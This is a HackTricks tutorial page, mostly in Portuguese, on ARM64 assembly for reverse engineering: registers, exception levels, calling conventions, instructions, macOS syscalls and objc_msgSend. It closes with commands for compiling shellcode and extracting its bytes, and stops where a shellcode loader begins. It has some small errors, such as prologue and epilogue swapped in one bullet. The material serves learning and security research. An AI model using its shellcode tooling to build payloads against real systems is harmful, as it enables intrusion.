# Introdução ao ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Níveis de Exceção - EL (ARM64v8)**

Na arquitetura ARMv8, os níveis de execução, conhecidos como Exception Levels (ELs), definem o nível de privilégio e as capacidades do ambiente de execução. Existem quatro níveis de exceção, variando de EL0 a EL3, cada um servindo a um propósito diferente:

1. **EL0 - User Mode**:
- Este é o nível com menor privilégio e é usado para executar código de aplicações regulares.
- Aplicações executando em EL0 são isoladas umas das outras e do software do sistema, aumentando a segurança e a estabilidade.
2. **EL1 - Operating System Kernel Mode**:
- A maioria dos kernels de sistemas operacionais roda neste nível.
- EL1 tem mais privilégios que EL0 e pode acessar recursos do sistema, mas com algumas restrições para garantir a integridade do sistema.
3. **EL2 - Hypervisor Mode**:
- Esse nível é usado para virtualização. Um hypervisor rodando em EL2 pode gerenciar múltiplos sistemas operacionais (cada um em seu próprio EL1) rodando no mesmo hardware físico.
- EL2 fornece recursos para isolamento e controle dos ambientes virtualizados.
4. **EL3 - Secure Monitor Mode**:
- Este é o nível mais privilegiado e é frequentemente usado para secure boot e ambientes de execução confiáveis.
- EL3 pode gerenciar e controlar acessos entre estados secure e non-secure (como secure boot, trusted OS, etc.).

O uso desses níveis permite uma forma estruturada e segura de gerenciar diferentes aspectos do sistema, desde aplicações de usuário até o software de sistema mais privilegiado. A abordagem do ARMv8 para níveis de privilégio ajuda a isolar efetivamente diferentes componentes do sistema, aumentando a segurança e robustez do sistema.

## **Registros (ARM64v8)**

ARM64 tem **31 registradores de uso geral**, rotulados `x0` até `x30`. Cada um pode armazenar um valor **64-bit** (8 bytes). Para operações que requerem apenas 32 bits, os mesmos registradores podem ser acessados em modo 32-bit usando os nomes `w0` até `w30`.

1. **`x0`** a **`x7`** - Tipicamente usados como registradores temporários e para passar parâmetros para sub-rotinas.
- **`x0`** também carrega os dados de retorno de uma função
2. **`x8`** - No kernel do Linux, `x8` é usado como o número da system call para a instrução `svc`. **In macOS the x16 is the one used!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - **Intra-procedural Call Registers**. Registradores temporários para valores imediatos. Também são usados para chamadas de função indiretas e stubs PLT (Procedure Linkage Table).
- **`x16`** é usado como o **system call number** para a instrução **`svc`** em **macOS**.
5. **`x18`** - **Platform register**. Pode ser usado como registrador de uso geral, mas em algumas plataformas este registrador é reservado para usos específicos da plataforma: ponteiro para o bloco de ambiente da thread atual no Windows, ou para apontar para a **executing task structure in linux kernel**.
6. **`x19`** a **`x28`** - São registradores preservados pelo callee. Uma função deve preservar os valores desses registradores para seu caller, então eles são armazenados na stack e recuperados antes de retornar ao caller.
7. **`x29`** - **Frame pointer** para rastrear o frame da stack. Quando um novo frame de stack é criado porque uma função é chamada, o registrador **`x29`** é **armazenado na stack** e o **novo** endereço do frame pointer (endereço de **`sp`**) é **armazenado neste registrador**.
- Este registrador também pode ser usado como registrador de uso geral embora normalmente seja usado como referência para **local variables**.
8. **`x30`** ou **`lr`** - **Link register**. Guarda o **endereço de retorno** quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada, armazenando o valor do **`pc`** neste registrador.
- Também pode ser usado como qualquer outro registrador.
- Se a função atual for chamar uma nova função e portanto sobrescrever `lr`, ela irá armazená-lo na stack no início; isso é o epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) e recuperá-lo no final; isso é o prólogo (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, usado para rastrear o topo da stack.
- O valor de **`sp`** deve sempre ser mantido com pelo menos um **alinhamento de quadword** ou uma exceção de alinhamento pode ocorrer.
10. **`pc`** - **Program counter**, que aponta para a próxima instrução. Este registrador só pode ser atualizado através de geração de exceções, retornos de exceção e branches. As únicas instruções ordinárias que podem ler este registrador são as branch with link (BL, BLR) para armazenar o endereço do **`pc`** em **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Também chamado **`wzr`** em sua forma de registrador **32**-bit. Pode ser usado para obter facilmente o valor zero (operação comum) ou para realizar comparações usando **`subs`** como **`subs XZR, Xn, #10`** armazenando o resultado em lugar nenhum (em **`xzr`**).

Os registradores **`Wn`** são a versão **32bit** do registrador **`Xn`**.

> [!TIP]
> Os registradores de X0 a X18 são voláteis, o que significa que seus valores podem ser alterados por chamadas de função e interrupções. Entretanto, os registradores de X19 a X28 são não-voláteis, significando que seus valores devem ser preservados através de chamadas de função ("callee saved").

### SIMD e Registradores de Ponto-Flutuante

Além disso, existem outros **32 registradores de 128bit** que podem ser usados em operações SIMD (single instruction multiple data) otimizadas e para realizar aritmética de ponto-flutuante. Estes são chamados de registradores Vn embora também possam operar em **64**-bit, **32**-bit, **16**-bit e **8**-bit e então são chamados **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`**.

### Registradores de Sistema

**Existem centenas de registradores de sistema**, também chamados de special-purpose registers (SPRs), usados para **monitorar** e **controlar** o comportamento dos **processadores**.\
Eles só podem ser lidos ou configurados usando as instruções especiais dedicadas **`mrs`** e **`msr`**.

Os registradores especiais **`TPIDR_EL0`** e **`TPIDDR_EL0`** são comumente encontrados ao fazer reverse engineering. O sufixo `EL0` indica o **nível mínimo de exceção** a partir do qual o registrador pode ser acessado (neste caso EL0 é o nível de exceção regular em que programas normais rodam).\
Eles são frequentemente usados para armazenar o **endereço base do thread-local storage** na memória. Normalmente o primeiro é legível e gravável por programas rodando em EL0, mas o segundo pode ser lido de EL0 e escrito a partir de EL1 (como o kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contém vários componentes do processo serializados no registrador especial visível ao sistema operacional **`SPSR_ELx`**, sendo X o **nível de permissão da exceção disparada** (isso permite recuperar o estado do processo quando a exceção termina).\
Estes são os campos acessíveis:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- As flags de condição **`N`**, **`Z`**, **`C`** e **`V`**:
- **`N`** significa que a operação produziu um resultado negativo
- **`Z`** significa que a operação produziu zero
- **`C`** significa que a operação gerou carry
- **`V`** significa que a operação gerou um overflow em números com sinal:
- A soma de dois números positivos produz um resultado negativo.
- A soma de dois números negativos produz um resultado positivo.
- Na subtração, quando um grande número negativo é subtraído de um número positivo menor (ou vice-versa), e o resultado não pode ser representado dentro do intervalo do tamanho de bits dado.
- Obviamente o processador não sabe se a operação é com sinal ou não, então ele checará C e V nas operações e indicará se ocorreu um carry no caso de ser signed ou unsigned.

> [!WARNING]
> Nem todas as instruções atualizam essas flags. Algumas como **`CMP`** ou **`TST`** o fazem, e outras que têm sufixo s como **`ADDS`** também o fazem.

- A flag de **largura atual do registrador (`nRW`)**: Se a flag tiver valor 0, o programa irá rodar no estado de execução AArch64 quando for retomado.
- O **Exception Level** atual (**`EL`**): Um programa regular rodando em EL0 terá o valor 0
- A flag de **single stepping** (**`SS`**): Usada por debuggers para single step ao configurar a flag SS para 1 dentro de **`SPSR_ELx`** via uma exceção. O programa executará um passo e gerará uma exceção de single step.
- A flag de **estado de exceção ilegal** (**`IL`**): É usada para marcar quando um software privilegiado realiza uma transferência de nível de exceção inválida; essa flag é setada para 1 e o processador dispara uma illegal state exception.
- As flags **`DAIF`**: Essas flags permitem que um programa privilegiado mascare seletivamente certas exceções externas.
- Se **`A`** for 1 significa que **asynchronous aborts** serão acionados. O **`I`** configura a resposta a **Interrupt Requests** externos (IRQs). e o F está relacionado a **Fast Interrupt Requests** (FIRs).
- As flags de **seleção do stack pointer** (**`SPS`**): Programas privilegiados rodando em EL1 e acima podem alternar entre usar seu próprio registrador stack pointer e o do modo usuário (por exemplo, entre `SP_EL1` e `EL0`). Esta troca é realizada escrevendo no registrador especial **`SPSel`**. Isso não pode ser feito a partir de EL0.

## **Calling Convention (ARM64v8)**

A calling convention do ARM64 especifica que os **oito primeiros parâmetros** para uma função são passados nos registradores **`x0` até `x7`**. Parâmetros **adicionais** são passados na **stack**. O valor de **retorno** é passado de volta no registrador **`x0`**, ou também em **`x1`** se for **128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** através de chamadas de função.

Ao ler uma função em assembly, procure pelo **prologue e epilogue da função**. O **prologue** geralmente envolve **salvar o frame pointer (`x29`)**, **configurar** um **novo frame pointer**, e **alocar espaço na stack**. O **epilogue** geralmente envolve **restaurar o frame pointer salvo** e **retornar** da função.

### Calling Convention em Swift

Swift tem sua própria **calling convention** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instruções Comuns (ARM64v8)**

Instruções ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o registrador de **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores **origem**. Valores imediatos também podem ser usados no lugar de registradores fonte.

- **`mov`**: **Move** um valor de um **registrador** para outro.
- Exemplo: `mov x0, x1` — Move o valor de `x1` para `x0`.
- **`ldr`**: **Load** um valor da **memória** para um **registrador**.
- Exemplo: `ldr x0, [x1]` — Carrega um valor da localização de memória apontada por `x1` em `x0`.
- **Modo offset**: Um offset afetando o ponteiro de origem é indicado, por exemplo:
- `ldr x2, [x1, #8]`, isto carregará em x2 o valor de x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, isto carregará em x2 um objeto do array x0, da posição x1 (index) * 4
- **Modo pré-indexado**: Isto aplicará cálculos à origem, obterá o resultado e também armazenará a nova origem na origem.
- `ldr x2, [x1, #8]!`, isto carregará `x1 + 8` em `x2` e armazenará em x1 o resultado de `x1 + 8`
- `str lr, [sp, #-4]!`, Armazena o link register em sp e atualiza o registrador sp
- **Modo post-index**: Isto é como o anterior, mas o endereço de memória é acessado e então o offset é calculado e armazenado.
- `ldr x0, [x1], #8`, carrega `x1` em `x0` e atualiza x1 com `x1 + 8`
- **Endereçamento relativo ao PC**: Neste caso o endereço a ser carregado é calculado relativo ao registrador PC
- `ldr x1, =_start`, Isto carregará em x1 o endereço onde o símbolo `_start` começa relacionado ao PC atual.
- **`str`**: **Store** um valor de um **registrador** para a **memória**.
- Exemplo: `str x0, [x1]` — Armazena o valor em `x0` na localização de memória apontada por `x1`.
- **`ldp`**: **Load Pair of Registers**. Esta instrução **carrega dois registradores** de **localizações de memória consecutivas**. O endereço de memória é tipicamente formado adicionando um offset ao valor em outro registrador.
- Exemplo: `ldp x0, x1, [x2]` — Carrega `x0` e `x1` das localizações de memória em `x2` e `x2 + 8`, respectivamente.
- **`stp`**: **Store Pair of Registers**. Esta instrução **armazena dois registradores** em **localizações de memória consecutivas**. O endereço de memória é tipicamente formado adicionando um offset ao valor em outro registrador.
- Exemplo: `stp x0, x1, [sp]` — Armazena `x0` e `x1` nas localizações de memória em `sp` e `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Armazena `x0` e `x1` nas localizações de memória em `sp+16` e `sp + 24`, respectivamente, e atualiza `sp` com `sp+16`.
- **`add`**: **Soma** os valores de dois registradores e armazena o resultado em um registrador.
- Sintaxe: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registrador ou imediato)
- \[shift #N | RRX] -> Realiza um shift ou chama RRX
- Exemplo: `add x0, x1, x2` — Soma os valores em `x1` e `x2` e armazena o resultado em `x0`.
- `add x5, x5, #1, lsl #12` — Isso equivale a 4096 (um 1 shiftado 12 vezes) -> 1 0000 0000 0000 0000
- **`adds`**: Isto executa um `add` e atualiza as flags
- **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
- Veja a **sintaxe** de **`add`**.
- Exemplo: `sub x0, x1, x2` — Subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
- **`subs`**: Isto é como `sub` mas atualizando as flags
- **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
- Exemplo: `mul x0, x1, x2` — Multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
- **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
- Exemplo: `div x0, x1, x2` — Divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Adiciona 0s no final movendo os outros bits para frente (multiplica por 2^n)
- **Logical shift right**: Adiciona 0s no início movendo os outros bits para trás (divide por 2^n em unsigned)
- **Arithmetic shift right**: Como **`lsr`**, mas em vez de adicionar 0s se o bit mais significativo for 1, **1s são adicionados** (divide por 2^n em signed)
- **Rotate right**: Como **`lsr`** mas o que é removido da direita é anexado à esquerda
- **Rotate Right with Extend**: Como **`ror`**, mas com a flag de carry como o "bit mais significativo". Assim a flag de carry é movida para o bit 31 e o bit removido vai para a flag de carry.
- **`bfm`**: **Bit Filed Move**, essas operações **copiam bits `0...n`** de um valor e os colocam nas posições **`m..m+n`**. O **`#s`** especifica a **posição do bit mais à esquerda** e **`#r`** a **quantidade de rotate right**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract e Insert:** Copia um bitfield de um registrador e o copia para outro registrador.
- **`BFI X1, X2, #3, #4`** Insere 4 bits de X2 a partir do bit 3 em X1
- **`BFXIL X1, X2, #3, #4`** Extrai do bit 3 de X2 quatro bits e os copia para X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits de X2 e os insere em X1 começando na posição de bit 3 zerando os bits à direita
- **`SBFX X1, X2, #3, #4`** Extrai 4 bits começando no bit 3 de X2, faz sign extend e coloca o resultado em X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits de X2 e os insere em X1 começando na posição de bit 3 zerando os bits à direita
- **`UBFX X1, X2, #3, #4`** Extrai 4 bits começando no bit 3 de X2 e coloca o resultado zero-extend em X1.
- **Sign Extend To X:** Estende o sinal (ou adiciona apenas 0s na versão unsigned) de um valor para poder realizar operações com ele:
- **`SXTB X1, W2`** Estende o sinal de um byte **de W2 para X1** (`W2` é metade de `X2`) para preencher os 64 bits
- **`SXTH X1, W2`** Estende o sinal de um número de 16 bits **de W2 para X1** para preencher os 64 bits
- **`SXTW X1, W2`** Estende o sinal de um valor de 32 bits **de W2 para X1** para preencher os 64 bits
- **`UXTB X1, W2`** Adiciona 0s (unsigned) a um byte **de W2 para X1** para preencher os 64 bits
- **`extr`**: Extrai bits de um **par especificado de registradores concatenados**.
- Exemplo: `EXTR W3, W2, W1, #3` Isto irá **concatenar W1+W2** e obter **do bit 3 de W2 até o bit 3 de W1** e armazenar em W3.
- **`cmp`**: **Compara** dois registradores e seta flags de condição. É um **alias de `subs`** configurando o registrador de destino para o registrador zero. Útil para saber se `m == n`.
- Suporta a **mesma sintaxe de `subs`**
- Exemplo: `cmp x0, x1` — Compara os valores em `x0` e `x1` e ajusta as flags de condição adequadamente.
- **`cmn`**: **Compare negative** operando. Neste caso é um **alias de `adds`** e suporta a mesma sintaxe. Útil para saber se `m == -n`.
- **`ccmp`**: Comparação condicional, é uma comparação que será executada apenas se uma comparação anterior foi verdadeira e irá especificamente setar bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> se x1 != x2 e x3 < x4, salta para func
- Isso porque **`ccmp`** será executado apenas se o **`cmp`** anterior tiver sido `NE`; se não for, os bits `nzcv` serão setados para 0 (o que não satisfará a comparação `blt`).
- Isto também pode ser usado como `ccmn` (mesmo mas negativo, como `cmp` vs `cmn`).
- **`tst`**: Verifica se algum dos valores da comparação tem bits em comum a 1 (funciona como um ANDS sem armazenar o resultado em lugar nenhum). É útil para checar um registrador com um valor e verificar se algum dos bits do registrador indicado pelo valor é 1.
- Exemplo: `tst X1, #7` Checa se algum dos últimos 3 bits de X1 é 1
- **`teq`**: Operação XOR descartando o resultado
- **`b`**: Branch incondicional
- Exemplo: `b myFunction`
- Note que isto não preencherá o link register com o endereço de retorno (não é adequado para chamadas de subrotina que precisam retornar)
- **`bl`**: **Branch** com link, usado para **chamar** uma **subrotina**. Armazena o **endereço de retorno em `x30`**.
- Exemplo: `bl myFunction` — Chama a função `myFunction` e armazena o endereço de retorno em `x30`.
- Note que isto não preencherá o link register com o endereço de retorno (não é adequado para subrotinas que precisam retornar)
- **`blr`**: **Branch** com Link para registrador, usado para **chamar** uma **subrotina** onde o destino é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`. (Isto é
- Exemplo: `blr x1` — Chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
- **`ret`**: **Retorna** de uma **subrotina**, tipicamente usando o endereço em **`x30`**.
- Exemplo: `ret` — Retorna da subrotina atual usando o endereço de retorno em `x30`.
- **`b.<cond>`**: Branches condicionais
- **`b.eq`**: **Branch se igual**, baseado na instrução `cmp` anterior.
- Exemplo: `b.eq label` — Se a instrução `cmp` anterior encontrou dois valores iguais, isto salta para `label`.
- **`b.ne`**: **Branch se Não Igual**. Esta instrução verifica as flags de condição (que foram setadas por uma instrução de comparação anterior), e se os valores comparados não foram iguais, ela faz branch para um label ou endereço.
- Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` — Se os valores em `x0` e `x1` não foram iguais, isto salta para `label`.
- **`cbz`**: **Compare and Branch on Zero**. Esta instrução compara um registrador com zero, e se forem iguais, faz branch para um label ou endereço.
- Exemplo: `cbz x0, label` — Se o valor em `x0` é zero, isto salta para `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Esta instrução compara um registrador com zero, e se não forem iguais, faz branch para um label ou endereço.
- Exemplo: `cbnz x0, label` — Se o valor em `x0` é não-zero, isto salta para `label`.
- **`tbnz`**: Testa bit e faz branch se não-zero
- Exemplo: `tbnz x0, #8, label`
- **`tbz`**: Testa bit e faz branch se zero
- Exemplo: `tbz x0, #8, label`
- **Operações de seleção condicional**: Estas são operações cujo comportamento varia dependendo dos bits condicionais.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Se verdadeiro, X0 = X1, se falso, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Se verdadeiro, Xd = Xn + 1, se falso, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Se verdadeiro, Xd = NOT(Xn), se falso, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = Xn, se falso, Xd = - Xm
- `cneg Xd, Xn, cond` -> Se verdadeiro, Xd = - Xn, se falso, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = 1, se falso, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Se verdadeiro, Xd = \<all 1>, se falso, Xd = 0
- **`adrp`**: Calcula o **endereço de página de um símbolo** e armazena em um registrador.
- Exemplo: `adrp x0, symbol` — Calcula o endereço de página de `symbol` e armazena em `x0`.
- **`ldrsw`**: **Load** um valor signed de **32-bit** da memória e **sign-extend para 64** bits.
- Exemplo: `ldrsw x0, [x1]` — Carrega um valor signed de 32 bits da localização de memória apontada por `x1`, sign-extends para 64 bits, e armazena em `x0`.
- **`stur`**: **Armazena** o valor de um registrador em uma localização de memória, usando um offset a partir de outro registrador.
- Exemplo: `stur x0, [x1, #4]` — Armazena o valor em `x0` no endereço de memória que é 4 bytes maior que o endereço atualmente em `x1`.
- **`svc`** : Faz uma **system call**. Significa "Supervisor Call". Quando o processador executa esta instrução, ele **troca de user mode para kernel mode** e pula para uma localização específica na memória onde o **código de tratamento de system call do kernel** está localizado.

- Exemplo:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prologue da Função**

1. **Salvar o link register e o frame pointer na stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar o novo ponteiro de quadro**: `mov x29, sp` (configura o novo ponteiro de quadro para a função atual)
3. **Alocar espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessários)

### **Epílogo da Função**

1. **Desalocar variáveis locais (se tiverem sido alocadas)**: `add sp, sp, <size>`
2. **Restaurar o registrador de link e o ponteiro de quadro**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (retorna o controle para o chamador usando o endereço no registrador de link)

## AARCH32 Estado de Execução

Armv8-A suporta a execução de programas de 32-bit. **AArch32** pode rodar em um de **dois conjuntos de instruções**: **`A32`** e **`T32`** e pode alternar entre eles via **`interworking`**.\
Programas de 64-bit **privilegiados** podem agendar a **execução de programas de 32-bit** executando uma transferência de nível de exceção para o 32-bit com privilégio inferior.\
Observe que a transição de 64-bit para 32-bit ocorre com um nível de exceção inferior (por exemplo um programa de 64-bit em EL1 disparando um programa em EL0). Isso é feito definindo o **bit 4 de** **`SPSR_ELx`** registrador especial **para 1** quando a thread do processo `AArch32` estiver pronta para ser executada e o restante de `SPSR_ELx` armazena o CPSR do programa **`AArch32`**. Então, o processo privilegiado chama a instrução **`ERET`** para que o processador transicione para **`AArch32`** entrando em A32 ou T32 dependendo do CPSR**.**

O **`interworking`** ocorre usando os bits J e T do CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Isso basicamente equivale a definir o **bit menos significativo como 1** para indicar que o conjunto de instruções é T32.\
Isso é definido durante as **instruções de desvio de interworking,** mas também pode ser definido diretamente com outras instruções quando o PC é definido como registrador de destino. Exemplo:

Outro exemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore registers every time.\
This is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored in **`SPSR_ELx`** when a exception is taken to restore later the execution:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

The fields are divided in some groups:

- Application Program Status Register (APSR): Arithmetic flags and accesible from EL0
- Execution State Registers: Process behaviour (managed by the OS).

#### Application Program Status Register (APSR)

- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just like in AArch64)
- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover, there isn't any instruction that checks its value implicitly, it must be done reading it manually.
- **`GE`** (Greater than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as "parallel add" and "parallel subtract". These operations allow processing multiple data points in a single instruction.

For example, the **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one of the byte additions, indicating if the addition for that byte pair **overflowed**.

The **`SEL`** instruction uses these GE flags to perform conditional actions.

#### Execution State Registers

- The **`J`** and **`T`** bits: **`J`** should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.
- **IT Block State Register** (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed group.
- **`E`** bit: Indicates the **endianness**.
- **Mode and Exception Mask Bits** (0-4): They determine the current execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the current priority** in case another exception is triggered while this is being handled.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Certain exceptions can be disabled using the bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. O número máximo de Mach traps é `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note que **Ida** e **Ghidra** também podem decompilar **dylibs específicos** do cache simplesmente passando o cache.

> [!TIP]
> Às vezes é mais fácil verificar o código **decompilado** de **`libsystem_kernel.dylib`** **do que** verificar o **código-fonte**, porque o código de várias syscalls (BSD e Mach) é gerado via scripts (ver comentários no código-fonte), enquanto no dylib você pode encontrar o que está sendo chamado.

### machdep calls

XNU suporta outro tipo de chamadas chamadas machine dependent. Os números dessas chamadas dependem da arquitetura e nem as chamadas nem os números são garantidos a permanecer constantes.

### comm page

Esta é uma página de memória pertencente ao kernel que é mapeada no address space de cada processo de usuário. Destina-se a tornar a transição do modo usuário para o kernel mais rápida do que usar syscalls para serviços do kernel que são usados com tanta frequência que essa transição seria muito ineficiente.

Por exemplo a chamada `gettimeofdate` lê o valor de `timeval` diretamente da comm page.

### objc_msgSend

É muito comum encontrar essa função usada em programas Objective-C ou Swift. Essa função permite chamar um método de um objeto Objective-C.

Parameters ([mais info na documentação](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Ponteiro para a instância
- x1: op -> Selector do método
- x2... -> Demais argumentos do método invocado

Então, se você colocar um breakpoint antes do branch para essa função, você pode descobrir facilmente o que está sendo invocado no lldb com (neste exemplo o objeto chama um objeto de `NSConcreteTask` que irá executar um comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ao definir a variável de ambiente **`NSObjCMessageLoggingEnabled=1`** é possível **log** quando essa função é chamada em um arquivo como `/tmp/msgSends-pid`.
>
> Além disso, definindo **`OBJC_HELP=1`** e executando qualquer binário você pode ver outras variáveis de ambiente que poderia usar para **log** quando certas ações Objc-C ocorrem.

Quando essa função é chamada, é necessário encontrar o método chamado da instância indicada; para isso são feitas diferentes buscas:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para macOS mais recentes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
